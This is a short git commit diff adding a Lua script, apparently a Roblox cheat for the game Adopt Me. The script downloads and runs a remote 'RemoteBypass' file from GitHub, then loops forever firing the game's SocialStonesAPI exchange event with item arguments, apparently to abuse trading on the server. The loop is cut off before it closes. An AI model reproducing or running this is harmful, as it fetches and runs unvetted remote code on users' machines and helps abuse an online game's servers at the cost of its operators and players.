dcea3c853a6bf69c204a7402e0217a5e6193a598
greg66n <darien95sm@hotmail.com>
2025-06-19 20:15:24 -0700

    Update adopt.lua

--- adopt.lua
+++ adopt.lua
@@ -1,1 +1,11 @@
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+wait(0.1)
+while true do
+    local args = {
+        "food",
+        "butterfly_2025_snapdragon_flower",
+        1
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("SocialStonesAPI/AttemptExchange"):FireServer(unpack(args))
+ 
